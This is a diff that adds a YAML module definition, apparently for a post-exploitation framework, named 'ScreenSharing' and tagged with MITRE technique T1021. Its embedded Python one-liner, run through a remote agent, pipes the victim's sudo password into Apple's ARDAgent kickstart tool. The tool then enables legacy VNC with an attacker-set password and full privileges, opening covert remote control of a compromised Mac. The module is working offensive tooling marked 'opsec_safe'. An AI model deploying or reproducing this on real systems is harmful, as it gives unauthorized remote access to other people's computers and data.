@@ -1,0 +1,30 @@
+name: ScreenSharing
+authors:
+  - '@n00py'
+description: Enables ScreenSharing to allow you to connect to the host via VNC.
+software: ''
+techniques:
+  - T1021
+background: false
+output_extension: ''
+needs_admin: false
+opsec_safe: true
+language: python
+min_language_version: '2.6'
+comments:
+  - https://www.unix-ninja.com/p/Enabling_macOS_screen_sharing_VNC_via_command_line
+options:
+  - name: Agent
+    description: Agent to execute module on.
+    required: true
+    value: ''
+  - name: Password
+    description: User password for sudo.
+    required: true
+    value: ''
+  - name: VNCpass
+    description: Password to use for VNC
+    required: true
+    value: ''
+script: |
+  import subprocess; subprocess.Popen("echo \\"{{ Password }}\\" | sudo -S sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -clientopts -setvnclegacy -vnclegacy yes -clientopts -setvncpw -vncpw {{ VNCpass }} -restart -agent -privs -all", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
